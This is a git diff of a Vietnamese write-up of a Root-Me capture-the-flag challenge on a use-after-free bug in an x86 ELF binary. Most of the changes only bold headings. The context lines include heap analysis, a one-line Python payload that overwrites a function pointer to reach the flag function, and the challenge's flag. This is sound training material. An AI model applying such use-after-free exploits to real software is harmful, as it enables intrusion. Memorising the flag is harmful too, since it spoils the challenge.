@@ -2,7 +2,9 @@
 ----
 
 [Challenges](https://www.root-me.org/en/Challenges/App-System/ELF-x86-Use-After-Free-basic)
-1.Source code
+
+<p></p>
+**1.Source code**
 
 ```
 #include <stdlib.h>
@@ -175,7 +177,7 @@ int main(){
     return 0;
 }
 ```
-2.Review source code
+**2.Review source code**
 
 Các điểm cần lưu ý:
 - Vùng cấp phát bộ nhớ của Dog có 12 byte cho name và 3 pointer <b>*bark,*bringBackTheFlag,*death</b> . Trong khi đó, Doghouse có 16 byte cho addresss và 8 byte cho name.
@@ -200,7 +202,7 @@ void death(struct Dog* dog){
     free(dog);
 }
 ```
-3.Review heap
+**3.Review heap**
 
 - Thông tin binary
 ```
@@ -359,13 +361,12 @@ Program received signal SIGSEGV, Segmentation fault.
 ```
 - Mục tiêu là viết giá trị **0x080487cb** (**bringBackTheFlag**)vào địa chỉ **0x9595014** 
 
-4.Payload
+**4.Payload**
 ```
 python -c "print '1\n' + 'AAAA\n' + '4\n' + '5\n' + 'BBBBCCCCDDDD\xcb\x87\x04\x08\n' + 'FFFF\n' + '2\n'" | ./ch63
 ```
 ![](Images/5.jpg)
-
-5.Flag
+**5.Flag**
 ```
 U44aafff_U4f_The_d0G
 ```
